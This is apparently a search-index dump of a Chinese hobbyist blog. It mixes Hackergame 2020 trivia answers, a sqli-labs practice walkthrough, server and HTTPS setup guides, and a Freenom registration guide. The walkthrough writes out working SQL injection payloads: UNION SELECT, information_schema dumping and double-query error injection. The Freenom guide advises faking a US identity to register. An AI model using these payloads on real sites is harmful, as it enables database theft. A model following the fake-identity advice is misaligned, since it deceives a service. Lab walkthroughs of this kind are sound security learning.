百度中国科学技术大学第六届信息安全大赛有个...圆满结束，就他了。点开第二行就是经统计，在本次比赛中，总共有 2682 人注册，1904 人至少完成了一题。比赛期间所有人合计提交了 17098 次 flag。（看这个网站的标志似乎还是第三题搜的那个USTC Linux 用户协会的官网新闻。嗷原来题目上已经说了是举办方👀） 参考答案：17098 完工。 ","date":"2020-11-01","objectID":"/posts/hackgame20201/:0:1","series":null,"tags":["web","Hackergame 2020","代码审计"],"title":"Hackgame2020(一)","uri":"/posts/hackgame20201/#第四题"},{"categories":["CTF"],"content":"猫咪问题++​ 秉着前面题都是简单题，试着做了一下，看到题目提示的有往年的问题题解 ​ 题意思很明显的书考验同学的搜题技巧。那就开工。 第一题 以下编程语言、软件或组织对应标志是哺乳动物的有几个？ Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce. 提示：学术上一般认为龙不属于哺乳动物。 ​ 本人只认识几个，那就一个一个搜呗。我的模式是：百度xxx标志然后第二条就是百度图片的搜索结果，大致辨别一下，然后再百度xxx是哺乳动物吗，妥妥的胎儿教学。 ​ 一个比较有印象就是FreeDOS这个标志就离谱，什么玩意 参考答案 ：12 第二题 第一个以信鸽为载体的 IP 网络标准的 RFC 文档中推荐使用的 MTU (Maximum Transmission Unit) 是多少毫克？ ​ 卡了我好一会，没听过信鸽传输，贴上最后找到答案的博客，以及一篇信鸽传输的历史发展，长见识了。 参考答案：256 第三题 USTC Linux 用户协会在 2019 年 9 月 21 日自由软件日活动中介绍的开源游戏的名称共有几个字母？ 提示：活动记录会在哪里？ ​ 搜索USTC Linux 用户协会发现这个协会就是科大爱好者们创建的。那么直接摸到他们官网的新闻版块（百度搜出来的是旧站，里面有新站的网址）。题目中还写道2019年9月21日自由软件日活动，那么官网肯定有那天的新闻。 ​ 找到一篇当天的新闻2019 软件自由日中国科大站，进取直接找，文章末尾有 最后一项是李文睿同学介绍了开源游戏 Teeworlds，由于底层代码开源，开发者可以做出自己的定制，可玩性非常高。 ​ 答案就是Teeworlds ​ 我还摸到了他们当天活动的记录资料：点我 ​ 在slides\\闪电演讲\\Teeworlds文件夹下有应该作者演讲的PPT和游戏的视频演示，有点心动了🤣 参考答案：9 第四题 中国科学技术大学西校区图书馆正前方（西南方向） 50 米 L 型灌木处共有几个连通的划线停车位？ ​ 直接百度地图搜图书馆，然后全景地图房门口，视野拉到L型灌木那。 参考答案：9 第五题 中国科学技术大学第六届信息安全大赛所有人合计提交了多少次 flag？ ​ 百度中国科学技术大学第六届信息安全大赛有个...圆满结束，就他了。点开第二行就是经统计，在本次比赛中，总共有 2682 人注册，1904 人至少完成了一题。比赛期间所有人合计提交了 17098 次 flag。（看这个网站的标志似乎还是第三题搜的那个USTC Linux 用户协会的官网新闻。嗷原来题目上已经说了是举办方👀） 参考答案：17098 完工。 ","date":"2020-11-01","objectID":"/posts/hackgame20201/:0:1","series":null,"tags":["web","Hackergame 2020","代码审计"],"title":"Hackgame2020(一)","uri":"/posts/hackgame20201/#第五题"},{"categories":["DROPS"],"content":"前言在线靶机地址：https://buuoj.cn/challenges#sqli-labs ","date":"2020-09-22","objectID":"/posts/sql-labs1/:1:0","series":null,"tags":["sql注入"],"title":"sql-labs(一)","uri":"/posts/sql-labs1/#前言"},{"categories":["DROPS"],"content":"less-1​ 首先说明sql注入的大致步骤： 判断注入类型。如整型字符型注入等。 判断列数 判断数据的回显位 构造sql语句 ​ 根据题目提示，说明是一个单引号注入题目，构造一个带单引号的语句?id=1'，发现数据库报错 ​ 通过后面的报错语句1'' LIMIT 0,1的分析，我们的单引号被数据库解析，那么说明我们也可以使用连接查询union插入我们想要查询的语句。 ​ 推出数据库的查询的部分语句可能为where id = '$id'LIMIT 0,1，那么通过构造闭合?id=1' [这里添加语句] --+添加自己想要语句，语句后面的--+作用是将后面的其他语句注释掉。 ​ 首先是判断字段个数：?id=1' order by 1 --+，页面显示正常，直到尝试?id=1' order by 4 --+发现数据库报错 ​ 说明数据库的字段值只有四个。 ​ 接下来测试数据的回显位，构造语句?id=' union select 1,2,3 --+，这里需要注意的有，前面id的查询一定是要不存在的，因为数据库只会回显第一条查询的数据，如果第一条语句查询成功则后面union构造的语句就不会显示；union连接查询语句后面查询的字段数需要和前面的字段数相等，详细用法可以自行查询。 ​ 执行后页面显示。 ​ 说明查询语句的2,3是回显位，之后就可以将查询的语句进行替换。如： ​ 获取数据库版本，数据库路径，当前用户，当前数据库： ​ ?id=' union select 1,concat_ws('_',user(),version(),database()),@@basedir --+ 页面显示 ​ 利用元数据库来爆表、爆数据 ​ ?id=' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+ ​ 之后大家可以自行发挥。 ​ flag的话我做的题是在ctftraining.flag表中，答案在：?id=' union select 1,flag,3 from ctftraining.flag --+ ","date":"2020-09-22","objectID":"/posts/sql-labs1/:2:0","series":null,"tags":["sql注入"],"title":"sql-labs(一)","uri":"/posts/sql-labs1/#less-1"},{"categories":["DROPS"],"content":"less-2​ 第二题看题目名称intiger based知大意，是id的数据类型由字符型变成了数字类型，这次就不使用单引号直接构造语句，和第一题差不多。 ","date":"2020-09-22","objectID":"/posts/sql-labs1/:3:0","series":null,"tags":["sql注入"],"title":"sql-labs(一)","uri":"/posts/sql-labs1/#less-2"},{"categories":["DROPS"],"content":"less-3​ 看标题Single quotes with twist，是在前面题的基础上加上了括号包裹，所以语句就成了where id = ('id')所以我们闭合的方式也要改变。附源码 ","date":"2020-09-22","objectID":"/posts/sql-labs1/:4:0","series":null,"tags":["sql注入"],"title":"sql-labs(一)","uri":"/posts/sql-labs1/#less-3"},{"categories":["DROPS"],"content":"less-4​ 标题Double Quotes，说明是个引号注入，把前面题的单引号改成双引号构成闭合即可。 ","date":"2020-09-22","objectID":"/posts/sql-labs1/:5:0","series":null,"tags":["sql注入"],"title":"sql-labs(一)","uri":"/posts/sql-labs1/#less-4"},{"categories":["DROPS"],"content":"less-5​ 标题Double Injection-Single Quotes，很明显提示是单引号，然后套用前面的方法， 发现这次题目变了，不管输入啥页面只显示一个You are in...........，但是数据库报错还是会显示，只要数据库错误还能显示，我们就可以是用一个新的技术把数据显示在错误信息上。 ​ 双查询注入也是我第一次听，贴一个讲大致原理的帖子：点我。 ​ 构造语句： ?id=' union select 1,2,3 from (select 1,count(*),concat_ws('____________',floor(rand()*2),concat_ws('********',version(),database()))a from information_schema.tables group by a)b --+ ​ 讲一下CONCAT_WS(separator,str1,str2,…)函数的用法：把str1、str2连接起来，并使用separator做分隔符。 ","date":"2020-09-22","objectID":"/posts/sql-labs1/:6:0","series":null,"tags":["sql注入"],"title":"sql-labs(一)","uri":"/posts/sql-labs1/#less-5"},{"categories":["瞎折腾"],"content":"​ 博客搭完了，自己选择的这个博客主题又是以图片为主要元素的，当然要考虑图片的使用问题了，原来打算直接放在服务器上，但是后来想了想，以后如果文章越写越多用的图太多服务器的流量也不够用，想到了图床这一托管图片的服务，但是放在别人的上面总怕会受到限制，正好发现了Chevereto这一图床系统，可以自己搭建一个图床服务器，正好自己还有一个阿里云学生云，那就开工。 ","date":"2020-09-20","objectID":"/posts/chevereto-%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E8%87%AA%E5%B7%B1%E7%9A%84%E5%9B%BE%E5%BA%8A/:0:0","series":null,"tags":["图床"],"title":"Chevereto-搭建一个自己的图床","uri":"/posts/chevereto-%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E8%87%AA%E5%B7%B1%E7%9A%84%E5%9B%BE%E5%BA%8A/#"},{"categories":["瞎折腾"],"content":"Chevereto 说明 Chevereto是一个可以帮助你建立自己的图像分享网站（图床）的应用程序，我们的目标是可以让世界上的任何一个人都可以建立自己的图像共享平台。我们坚定不移的为那些想要可定制的白标图像共享服务的人建立一个真正的替代品。 Chevereto分为免费版和付费版，区别肯定就是大小什么的，我这个搭在学生云上肯定就不用想我会选择哪个了吧🤣 ","date":"2020-09-20","objectID":"/posts/chevereto-%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E8%87%AA%E5%B7%B1%E7%9A%84%E5%9B%BE%E5%BA%8A/:0:1","series":null,"tags":["图床"],"title":"Chevereto-搭建一个自己的图床","uri":"/posts/chevereto-%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E8%87%AA%E5%B7%B1%E7%9A%84%E5%9B%BE%E5%BA%8A/#chevereto-说明"},{"categories":["瞎折腾"],"content":"环境说明因为Chevereto所需要的环境为 Apache/Nginx PHP 5.5+ MySQL 5.0+ 我太懒了不想动所以我选择使用宝塔面板为我们搭建web环境。 宝塔面板官网：https://www.bt.cn/ 安装完成以后进入管理面板应该会直接提示你安装需要的环境 我的环境如下图 ","date":"2020-09-20","objectID":"/posts/chevereto-%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E8%87%AA%E5%B7%B1%E7%9A%84%E5%9B%BE%E5%BA%8A/:0:2","series":null,"tags":["图床"],"title":"Chevereto-搭建一个自己的图床","uri":"/posts/chevereto-%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E8%87%AA%E5%B7%B1%E7%9A%84%E5%9B%BE%E5%BA%8A/#环境说明"},{"categories":["瞎折腾"],"content":"总结安装步骤 去github下载Chevereto的压缩包。 在宝塔面板上新建网站目录，创建一个存图片的数据库(自行创建)。 将Chevereto的压缩包上传到网站目录解压。 访问新建的网站就是Chevereto的管理面板，并进行初始配置。 无了。 ","date":"2020-09-20","objectID":"/posts/chevereto-%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E8%87%AA%E5%B7%B1%E7%9A%84%E5%9B%BE%E5%BA%8A/:0:3","series":null,"tags":["图床"],"title":"Chevereto-搭建一个自己的图床","uri":"/posts/chevereto-%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E8%87%AA%E5%B7%B1%E7%9A%84%E5%9B%BE%E5%BA%8A/#总结安装步骤"},{"categories":["瞎折腾"],"content":"开始 github下载地址 创建网站目录和数据库用户 因为我域名所以域名留空，提示默认使用80端口，访问地址就是服务器ip地址，剩下的自己随机发挥。 创建完成后需要配置一下网站配置文件才可以访问到配置页面。 在server{...}中添加 location / { try_files $uri $uri/ /index.php?$query_string; } 配置完成以后应该会自动保存并重启Nginx。 将在github上下载的Chevereto压缩包上传到刚刚创建的网站目录中（上图是/www/wwwroot）并解压。 之后就可以直接访问服务器ip:80（80端口可以省略），然后一步一步的进行配置。 可能会出现的错误 Chevereto can’t create the app/settings.php file. You must manually create this file 解决方法：这个错误就是没有找到setting.php配置文件，压缩包内似乎没有创建该文件，我们可以自行创建，在Chevereto的网站目录下的/app目录下执行命令创建文件，并修改文件权限 touch settings.php chmod +x settings.php 我自己还遇到了第二个错误，大概的意思就是访问权限不足blahbalhblahbla，我改了好久都不行。最后直接把整个网站目录的权限给改了访问成功。知道这样做不对，希望大佬能指点。 访问网站进行网站的初始化配置，大概就是填写数据库名称、数据库账号密码、管理员的账户和密码和一些信息。 完成以后就可以登陆管理员账号进入管理面板，我是首先去设置里找到语言设置把面板改成了中文。 ","date":"2020-09-20","objectID":"/posts/chevereto-%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E8%87%AA%E5%B7%B1%E7%9A%84%E5%9B%BE%E5%BA%8A/:0:4","series":null,"tags":["图床"],"title":"Chevereto-搭建一个自己的图床","uri":"/posts/chevereto-%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E8%87%AA%E5%B7%B1%E7%9A%84%E5%9B%BE%E5%BA%8A/#开始"},{"categories":["瞎折腾"],"content":"完工管理面板还有好多其他功能，我都还没研究过，大伙可以以后可以自己慢慢学习 然后我的图床地址：http://47.97.231.10/ (已失效) 🈚👇👻来丶se兔 ","date":"2020-09-20","objectID":"/posts/chevereto-%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E8%87%AA%E5%B7%B1%E7%9A%84%E5%9B%BE%E5%BA%8A/:0:5","series":null,"tags":["图床"],"title":"Chevereto-搭建一个自己的图床","uri":"/posts/chevereto-%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E8%87%AA%E5%B7%B1%E7%9A%84%E5%9B%BE%E5%BA%8A/#完工"},{"categories":["服务器"],"content":"参考文章:Let’s Encrypt，免费好用的 HTTPS 证书 ","date":"2020-09-03","objectID":"/posts/lets-encrypt-%E5%85%8D%E8%B4%B9https%E8%AF%81%E4%B9%A6/:0:0","series":null,"tags":null,"title":"Let_s_Encrypt 免费Https证书","uri":"/posts/lets-encrypt-%E5%85%8D%E8%B4%B9https%E8%AF%81%E4%B9%A6/#"},{"categories":["服务器"],"content":"先放官网Let’s Encrypt Let’s Encrypt 是免费、自动化、开放的证书签发服务, 它得到了 Mozilla、Cisco、Akamai、Electronic Frontier Foundation 和 Chrome 等众多公司和机构的支持，发展十分迅猛 所需环境 一个 HTTP 服务，以 Nginx 为例 python 两个目录: /site 网站目录 /site_site_cert 保存证书的目录 证书的颁发有两种方式： 通过在线生成通过网址在线生成，需要验证文件 通过程序生成通过本地 IIS，生成后会自动绑定本地 IIS 站点上的HTTPS 域名。 我使用的是第一种方法：在线生成，原理是：先在你的服务器上传一个密钥，然后Let’s Encrypt会对网站进行访问，下载密钥进行验证。 ","date":"2020-09-03","objectID":"/posts/lets-encrypt-%E5%85%8D%E8%B4%B9https%E8%AF%81%E4%B9%A6/:0:1","series":null,"tags":null,"title":"Let_s_Encrypt 免费Https证书","uri":"/posts/lets-encrypt-%E5%85%8D%E8%B4%B9https%E8%AF%81%E4%B9%A6/#先放官网"},{"categories":["服务器"],"content":"先放官网Let’s Encrypt Let’s Encrypt 是免费、自动化、开放的证书签发服务, 它得到了 Mozilla、Cisco、Akamai、Electronic Frontier Foundation 和 Chrome 等众多公司和机构的支持，发展十分迅猛 所需环境 一个 HTTP 服务，以 Nginx 为例 python 两个目录: /site 网站目录 /site_site_cert 保存证书的目录 证书的颁发有两种方式： 通过在线生成通过网址在线生成，需要验证文件 通过程序生成通过本地 IIS，生成后会自动绑定本地 IIS 站点上的HTTPS 域名。 我使用的是第一种方法：在线生成，原理是：先在你的服务器上传一个密钥，然后Let’s Encrypt会对网站进行访问，下载密钥进行验证。 ","date":"2020-09-03","objectID":"/posts/lets-encrypt-%E5%85%8D%E8%B4%B9https%E8%AF%81%E4%B9%A6/:0:1","series":null,"tags":null,"title":"Let_s_Encrypt 免费Https证书","uri":"/posts/lets-encrypt-%E5%85%8D%E8%B4%B9https%E8%AF%81%E4%B9%A6/#所需环境"},{"categories":["服务器"],"content":"先放官网Let’s Encrypt Let’s Encrypt 是免费、自动化、开放的证书签发服务, 它得到了 Mozilla、Cisco、Akamai、Electronic Frontier Foundation 和 Chrome 等众多公司和机构的支持，发展十分迅猛 所需环境 一个 HTTP 服务，以 Nginx 为例 python 两个目录: /site 网站目录 /site_site_cert 保存证书的目录 证书的颁发有两种方式： 通过在线生成通过网址在线生成，需要验证文件 通过程序生成通过本地 IIS，生成后会自动绑定本地 IIS 站点上的HTTPS 域名。 我使用的是第一种方法：在线生成，原理是：先在你的服务器上传一个密钥，然后Let’s Encrypt会对网站进行访问，下载密钥进行验证。 ","date":"2020-09-03","objectID":"/posts/lets-encrypt-%E5%85%8D%E8%B4%B9https%E8%AF%81%E4%B9%A6/:0:1","series":null,"tags":null,"title":"Let_s_Encrypt 免费Https证书","uri":"/posts/lets-encrypt-%E5%85%8D%E8%B4%B9https%E8%AF%81%E4%B9%A6/#通过在线生成"},{"categories":["服务器"],"content":"先放官网Let’s Encrypt Let’s Encrypt 是免费、自动化、开放的证书签发服务, 它得到了 Mozilla、Cisco、Akamai、Electronic Frontier Foundation 和 Chrome 等众多公司和机构的支持，发展十分迅猛 所需环境 一个 HTTP 服务，以 Nginx 为例 python 两个目录: /site 网站目录 /site_site_cert 保存证书的目录 证书的颁发有两种方式： 通过在线生成通过网址在线生成，需要验证文件 通过程序生成通过本地 IIS，生成后会自动绑定本地 IIS 站点上的HTTPS 域名。 我使用的是第一种方法：在线生成，原理是：先在你的服务器上传一个密钥，然后Let’s Encrypt会对网站进行访问，下载密钥进行验证。 ","date":"2020-09-03","objectID":"/posts/lets-encrypt-%E5%85%8D%E8%B4%B9https%E8%AF%81%E4%B9%A6/:0:1","series":null,"tags":null,"title":"Let_s_Encrypt 免费Https证书","uri":"/posts/lets-encrypt-%E5%85%8D%E8%B4%B9https%E8%AF%81%E4%B9%A6/#通过程序生成"},{"categories":["服务器"],"content":"开工","date":"2020-09-03","objectID":"/posts/lets-encrypt-%E5%85%8D%E8%B4%B9https%E8%AF%81%E4%B9%A6/:0:2","series":null,"tags":null,"title":"Let_s_Encrypt 免费Https证书","uri":"/posts/lets-encrypt-%E5%85%8D%E8%B4%B9https%E8%AF%81%E4%B9%A6/#开工"},{"categories":["服务器"],"content":"创建账号首先创建一个目录，我是在根目录下创建文件夹site_cert mkdir /site_cert 这个文件夹用来存放各种临时文件和最后的证书文件。进入这个目录，创建一个RSA私钥，用于Let’s Encrypt识别你的身份 openssl genrsa 4096 \u003e account.key ","date":"2020-09-03","objectID":"/posts/lets-encrypt-%E5%85%8D%E8%B4%B9https%E8%AF%81%E4%B9%A6/:0:3","series":null,"tags":null,"title":"Let_s_Encrypt 免费Https证书","uri":"/posts/lets-encrypt-%E5%85%8D%E8%B4%B9https%E8%AF%81%E4%B9%A6/#创建账号"},{"categories":["服务器"],"content":"创建CSR文件在这之前，还需要创建域名私钥（一定不要使用上面的账户私钥） openssl genrsa 4096 \u003e domain.key 我参考的文章提到了两种私钥RSA和ECC，我现在也还不懂什么原理，把两种区别放出来吧 RSA 私钥：兼容性好 ECC 私钥：部分老旧操作系统、浏览器不支持。优点是证书体积小 两个用于身份身份验证的私钥文件创建好，就可以生成CSR（Certificate Signing Request，证书签名请求）文件了，申请时可以把域名带 www 和不带 www 的两种情况都加进去，一张证书最多可以包含100个域名。 openssl req -new -sha256 -key domain.key -subj \"/\" -reqexts SAN -config \u003c(cat /etc/ssl/openssl.cnf \u003c(printf \"[SAN]\\nsubjectAltName=DNS:yoursite.com,DNS:www.yoursite.com\")) \u003e domain.csr 其中DNS的yoursite.com和www.yoursite.com记得要换成自己的域名 我在这里遇到了问题提示找不到/etc/ssl/openssl.cnf文件，在网上找的的解决办法是 执行 : openssl version -a 会输出openssl的信息，其中OPENSSLDIR对应的路径就是openssl.cnf文件的地址，自行将上面的cat /etc/ssl/openssl.cnf,改为自己的路径运行。 ","date":"2020-09-03","objectID":"/posts/lets-encrypt-%E5%85%8D%E8%B4%B9https%E8%AF%81%E4%B9%A6/:0:4","series":null,"tags":null,"title":"Let_s_Encrypt 免费Https证书","uri":"/posts/lets-encrypt-%E5%85%8D%E8%B4%B9https%E8%AF%81%E4%B9%A6/#创建csr文件"},{"categories":["服务器"],"content":"配置验证服务前面介绍过了Let’s Encrypt验证的原理是在你的服务器上生成一个随机文件，在通过创建CSR时的域名进行访问下载，如果成功表明你对这个域名的拥有权。 创建用于存放网站的目录site以及用于验证文件存放的子目录 mkdir -p /site/.well-known/acme-challenge/ 然后再Nginx中配置: server { server_name www.yoursite.com yoursite.com; location ^~ /.well-known/acme-challenge/ { alias /home/xxx/www/challenges/; try_files $uri =404; } location / { rewrite ^/(.*)$ https://yoursite.com/$1 permanent; } } 别忘了改yoursite 这个配置会优先查找/site目录下的网站，建议保留以后证书认证还可以用到，因为颁发的证书一次可以使用90天。 ","date":"2020-09-03","objectID":"/posts/lets-encrypt-%E5%85%8D%E8%B4%B9https%E8%AF%81%E4%B9%A6/:0:5","series":null,"tags":null,"title":"Let_s_Encrypt 免费Https证书","uri":"/posts/lets-encrypt-%E5%85%8D%E8%B4%B9https%E8%AF%81%E4%B9%A6/#配置验证服务"},{"categories":["服务器"],"content":"获取网站证书先下载acme-tiny脚本到之前的site_cert目录： wget https://raw.githubusercontent.com/diafygi/acme-tiny/master/acme_tiny.py 指定账户私钥、CSR以及网站上验证文件的目录，执行脚本: python acme_tiny.py --account-key ./account.key --csr ./domain.csr --acme-dir /fakesite/.well-known/acme-challenge/ \u003e ./signed.crt 执行成功的话会在当前目录生成一个signed.crt文件，这个文件就是申请好的证书文件。 我在这里出现了错误提示 ValueError: Wrote file to /site/.well-known/acme-challenge/blablabla, but couldn't download http://www.yoursite.com/.well-known/acme-challenge/blablabla 大概的意思就是，在网站目录里写入了一个验证文件，但是Let’s Encrypt的服务器访问不到你的网站，建议先去看一看Nginx配置是否出错，再有可能是自己的域名无法在国外解析，建议暂时使用国外的DNS解析商。推荐的有： Hurricane Electric Free DNS ZoneEdit CloudFlare 这些都是免费的，但是因为我自己的域名后缀为.tk，上面第一个DNS解析商警告因为.tk域名滥用，不给解析。 网站证书到手以后，还要下载 Let’s Encrypt 的中间证书。证书链中大部分都是「站点证书 – 中间证书 – 根证书」这样三级。服务端只需要发送前两个证书即可。我们需要把中间证书和网站证书合在一起： wget -O - https://letsencrypt.org/certs/lets-encrypt-x3-cross-signed.pem \u003e intermediate.pem cat signed.crt intermediate.pem \u003e chained.pem 最终，在Nginx中添加证书配置，并reload，我的部分配置如下 server { listen 443 ssl; ssl_certificate /site_cert/chained.pem; ssl_certificate_key /site_cert/domain.key; ssl_protocols TLSv1 TLSv1.1 TLSv1.2; ssl_ciphers HIGH:!aNULL:!MD5; server_name braindance.tk; index index.html index.htm; root ………………………… } 执行 nginx -s reload ","date":"2020-09-03","objectID":"/posts/lets-encrypt-%E5%85%8D%E8%B4%B9https%E8%AF%81%E4%B9%A6/:0:6","series":null,"tags":null,"title":"Let_s_Encrypt 免费Https证书","uri":"/posts/lets-encrypt-%E5%85%8D%E8%B4%B9https%E8%AF%81%E4%B9%A6/#获取网站证书"},{"categories":["服务器"],"content":"证书自动更新 计划任务​ 至此我们已经成功的获取到了Https证书，但是获取到的Https证书只有90天的时效，到期的话还需要使用相同的方法进行更新，为了避免某次忘记更新导致网站出现问题，我们可以使用linux中的crond服务为我们自动更新证书。 用 vi 在 /site_cert 文件夹 创建 计划任务脚本 renew_cert.sh vi /site_cert/renew_cert.sh 通过vi输入以下内容 #!/bin/bash cd /fakesite_cert/ python acme_tiny.py --account-key ./account.key --csr ./domain.csr --acme-dir /fakesite/.well-known/acme-challenge/ \u003e ./signed.crt || exit wget -O - https://letsencrypt.org/certs/lets-encrypt-x3-cross-signed.pem \u003e intermediate.pem cat signed.crt intermediate.pem \u003e chained.pem nginx -s reload 更新的大致过程是，运行python脚本再次更新signed.crt申请证书文件，再进行证书合并写入chained.pem文件。 然后给这个文件赋予 可执行 属性 chmod +x /fakesite_cert/renew_cert.sh 使用crontab -e指令打开定时任务配置文件，并加入以下内容。 0 0 1 * * /home/xxx/shell/renew_cert.sh \u003e/dev/null 2\u003e\u00261 对于上面指令的具体意思请自行搜索crontab命令 ","date":"2020-09-03","objectID":"/posts/lets-encrypt-%E5%85%8D%E8%B4%B9https%E8%AF%81%E4%B9%A6/:0:7","series":null,"tags":null,"title":"Let_s_Encrypt 免费Https证书","uri":"/posts/lets-encrypt-%E5%85%8D%E8%B4%B9https%E8%AF%81%E4%B9%A6/#证书自动更新-计划任务"},{"categories":["服务器"],"content":"完工","date":"2020-09-03","objectID":"/posts/lets-encrypt-%E5%85%8D%E8%B4%B9https%E8%AF%81%E4%B9%A6/:0:8","series":null,"tags":null,"title":"Let_s_Encrypt 免费Https证书","uri":"/posts/lets-encrypt-%E5%85%8D%E8%B4%B9https%E8%AF%81%E4%B9%A6/#完工"},{"categories":["流水账"],"content":"​ 服务器到手了肯定不能闲着，既然有了国外的服务器，第一个想法就是去整一个魔法，我姐也因为网络问题，经常让我帮忙下载国外的资料，这次整一个就能让我姐自己用了。 ​ 还是出于会被Qang的顾虑，自己对于这方面的知识也很少，普通的建设方法据说已经会被主动嗅探等给检测到，于是就花了很久找伪装的方法，结果在github上找到了一个项目，使用的技术大概就是反向代理+Https的协议，这里就不细讲了主要是害怕，可以自己到项目去看看。 ​ 在这里还学会了搞Let’s Encrypt的SSL证书，主要是用来保证数据的加密传输，也就是Https协议，后面开一篇申请证书的过程文章，照着参阅的文章也踩了不少坑。 ","date":"2020-09-02","objectID":"/posts/%E6%90%AD%E7%AA%9D%E8%BF%87%E7%A8%8B%E4%BA%8C/:0:0","series":null,"tags":null,"title":"搭窝过程(二)","uri":"/posts/%E6%90%AD%E7%AA%9D%E8%BF%87%E7%A8%8B%E4%BA%8C/#"},{"categories":["服务器"],"content":"1.官网Freenom - 人人都熟悉的名字 官网右上角可以切换中文，简直了。 然后觉得我讲的有点啰嗦的还可以看油管上的freenom教学视频 ","date":"2020-09-02","objectID":"/posts/freenom%E5%9F%9F%E5%90%8D%E6%B3%A8%E5%86%8C%E8%A7%A3%E6%9E%90%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8/:0:1","series":null,"tags":null,"title":"Freenom域名注册解析到服务器","uri":"/posts/freenom%E5%9F%9F%E5%90%8D%E6%B3%A8%E5%86%8C%E8%A7%A3%E6%9E%90%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8/#1官网"},{"categories":["服务器"],"content":"2.搜索想要的域名​ 搜索以后会列出来可以选择的域名列表，上面的是免费域名，下面的则是一些付费域名。 ​ 我在这里还遇到了一个坑提前说。freenom提供的有自己的域名解析服务，国内也可以访问的到，我遇到了一个问题有回答说换个DNS解析就行，推荐的是Hurricane Electric Hosted DNS，但这个网站禁止了.tk域名的解析。类似的问题请自行先考虑 接下来选中域名以后点击Get it now！以后只是添加到购物车，随后点击界面中的Checkout跳转到结算界面，这里只用选择期限即可。 点击continue按钮会提示注册，这里又有坑。 由于蝗虫一般涌入试图薅羊毛的中国人让 freenom 极度不爽, freenom 的免费域名注册对中国人并不友好, 极大概率注册会失败. 为了顺利注册免费域名, 请首先用美国 IP 翻着墙, 使用 Google 账号直接登录该站, 不必自主注册账号, 在填写个人资料时, 用 fakenamegenerator.com 胡诌个美国住址, 就可以随意注册免费域名了. ","date":"2020-09-02","objectID":"/posts/freenom%E5%9F%9F%E5%90%8D%E6%B3%A8%E5%86%8C%E8%A7%A3%E6%9E%90%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8/:0:2","series":null,"tags":null,"title":"Freenom域名注册解析到服务器","uri":"/posts/freenom%E5%9F%9F%E5%90%8D%E6%B3%A8%E5%86%8C%E8%A7%A3%E6%9E%90%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8/#2搜索想要的域名"},{"categories":["服务器"],"content":"3.域名解析​ 完成以后点击Services–\u003eMy Domains进入域名管理页面。 点击域名后面的Manage Domain进入域名解析 ​ Nameservers就是域名解析服务器进入后两个选项，第一个是使用freenom的域名解析服务器，第二个是使用其他域名解析商的服务器。 之后点击Manage Freenom DNS进行域名解析就可以使用注册的域名访问了，示例： ","date":"2020-09-02","objectID":"/posts/freenom%E5%9F%9F%E5%90%8D%E6%B3%A8%E5%86%8C%E8%A7%A3%E6%9E%90%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8/:0:3","series":null,"tags":null,"title":"Freenom域名注册解析到服务器","uri":"/posts/freenom%E5%9F%9F%E5%90%8D%E6%B3%A8%E5%86%8C%E8%A7%A3%E6%9E%90%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8/#3域名解析"},{"categories":["流水账"],"content":" 备案劝退 很早就有想搭博客的想法了，起初在阿里云上用宝塔面板搭建过一个，觉得IP访问太暴露了就想去备案，结果阿里云的备案过程真的是把我给整吐了，大概流程就是：填网站信息»\u003e阿里云审核通过»\u003e工信部审核。看似个简单的过程，我在阿里云审核那就被劝退了，官方小改改先是跟我说填写信息不能有什么什么字眼，很耐心的帮我改了改，然后让我提供钉钉号，说一会会有官方加我好友跟我视频认证，这对于稍微有点自闭的我来说有点难顶，但想都到这步了硬着头皮来吧。等了一个多小时，我看到邮箱里有封邮件说我拒绝视频认证，审核失败，我tm直接当场？？？看了看钉钉申请和审核失败的邮件，之间就相差了2分钟。 选择服务器 听说了备案的依据是服务器的地理位置，想到去买国外的服务器，在知乎、谷歌上搜了一大堆国外的服务商，大致推荐的都是：vultr、搬瓦工、blablablabal，看到价格和配置都特别心动，但是都是很久之前的信息，现在已经变贵了，最后挑了一个现在最便宜的pacificrack,看评价说便宜的原因就是超售，而且服务商有可能跑路balbabla的，我现在就心想体验一番管他呢，最后买的配置1cpu 1G 20GB 100Mbps一年$12，觉得比阿里云那个学生云香，最重要的是不用备案！！！！ 域名注册 服务器到手以后，又听说什么国外的服务器有可能会被Qang，我也尽量少选国内提供的服务，随后找到了国外免费的域名注册商freenom，注册了域名braindanc.tk，把域名解析到自己的服务器，后面补一篇注册的过程吧。 到这服务器和域名都搞定了。 ","date":"2020-09-02","objectID":"/posts/%E9%80%A0%E7%AA%9D%E8%BF%87%E7%A8%8B-%E4%B8%80/:0:0","series":null,"tags":null,"title":"造窝过程(一)","uri":"/posts/%E9%80%A0%E7%AA%9D%E8%BF%87%E7%A8%8B-%E4%B8%80/#"},{"categories":["流水账"],"content":"第一篇文章的内容 刚把博客搭成，然后看了看markdown的语法，以后慢慢往上面加吧。 ","date":"2020-08-26","objectID":"/posts/%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/:0:0","series":null,"tags":null,"title":"第一篇文章","uri":"/posts/%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/#"},{"categories":["DROPS"],"content":"[极客大挑战 2019]RCE ME源码： \u003c?php error_reporting(0); if(isset($_GET['code'])){ $code=$_GET['code']; if(strlen($code)\u003e40){ 